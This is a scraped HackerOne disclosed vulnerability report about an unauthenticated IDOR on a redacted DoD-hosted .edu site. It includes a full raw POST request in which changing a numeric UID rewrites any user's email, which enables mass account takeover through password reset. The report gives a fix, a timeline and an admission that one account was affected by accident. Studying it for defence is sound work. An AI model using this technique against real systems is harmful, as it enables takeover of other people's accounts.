---
title: "Unauth IDOR to mass account takeover without user interaction on the [redacted] (https://[redacted].edu/)"
author: sp1d3rs (Eugene Yakovchuk)
url: https://hackerone.com/reports/685338
date_published: 2024-07-19 (reported 2019-08-31, resolved 2020-02-28, disclosed 2024-07-19)
date_scraped: 2026-11-16
platform: hackerone
disclosed_report: https://hackerone.com/reports/685338
bounty: not stated (hidden on report)
vuln_class: idor
---

<!-- Raw scraped text below. Public, non-paywalled content only.
     This file is source material, never copied into skills verbatim. -->

Report #685338, U.S. Dept Of Defense VDP. Severity: High (7 ~ 8.9). Weakness: Insecure Direct Object Reference (IDOR). Status: Resolved. Disclosed July 19, 2024. Reporter: sp1d3rs. Bounty: hidden.

## Description

During poking around [redacted]/24 range - AS257 [redacted] looking for the Cisco devices, I came across virtual host https://[redacted].edu/ on the [redacted]
While it's a not .mil host, it's likely related to the DoD since it hosted in the DoD-controlled ASN.

I discovered IDOR possibility to mass accounts takeover just by altering a numeric ID.
Resource seems to have ~320 000 accounts (the users ID is incremental and started for me from 320573), and all of them can be taken over with simple automation.

## POC

1) You need to register some test accounts using:
[redacted]
Make sure your password are not too long (resource can strip it). Something like 6-7 chars should be ok.
2) When registering, monitor the requests. Once you press the final "Register" button, the request to the
https://[redacted].edu/chkUser.aspx endpoint will be issued.
Write down the numeric `UID` parameter in the response.
3) Login with your account to check it works.
4) Logout.
5) Issue next unauth POST request (replace `UID` parameter by your numeric UID you noted earlier):

```
POST /chkUser.aspx HTTP/1.1
Host: [redacted].edu
Connection: keep-alive
Accept: */*
Origin: https://[redacted].edu
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Referer: https://[redacted].edu/
Accept-Encoding: gzip, deflate, br
Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7
Content-Length: 281
Content-Type: application/x-www-form-urlencoded

dummy=&sendingForm=6&UID=[YOUR_ID_HERE]&last=test&midd=&frst=test&serv=test&mail=dummyemail@dummy.tld&tLang=&course=1&school=Other+non-Government&other&freq=Rarely&test=1&reading_score=&listening_score=aaa&speaking_score=aaa&test_taken=Other&other_test=test&when=more+than+a+year+ago
```

6) Your email will be changed to the `dummyemail@dummy.tld`
You can login with this email and your password to check it works. You will be unable to login with old email.
Attacker may use it flaw to point account to his email and then initiate password reset.

Note, that endpoint is also vulnerable to the CSRF in same time, since there is no any CSRF protection (it worth to fix tho), but I'm reporting here IDOR since it poses much more risks.

## Notes

In terms of transparency I should notify that during testing, I accidentally could affect single account with ID `320572` (my accounts were `320573`, `320574` and `320575`).
I never expected that unauth request will actually work, and instead incrementing my ID I accidentally decremented it and likely changed someone's email to the `test@test.test`. This user will likely be unable to login, so it worth to identify him and giving this email (or restore original) so he/she will be able to login (password was unchanged, and I didn't access account itself). I have no evidence does this account active, inactive or ever exist, just notify that it **could** be affected.

## Suggested fix

Check that UID belongs to the current user session, or better drop this parameter at all, and allow to change the user data based on the current authenticated session.

## Impact

Takeover any user account without interaction by changing the email via numeric ID. Attacker can after initiate password reset and authorize on behalf of the victim.
The endpoint is also vulnerable to the CSRF.

## Timeline (condensed)

- 2019-08-31: reported to U.S. Dept Of Defense
- 2019-09-03: severity set to high, triaged
- 2020-02-28: resolved
- 2024-06-18: reporter requested disclosure
- 2024-07-19: DoD agreed to disclose; report disclosed and locked
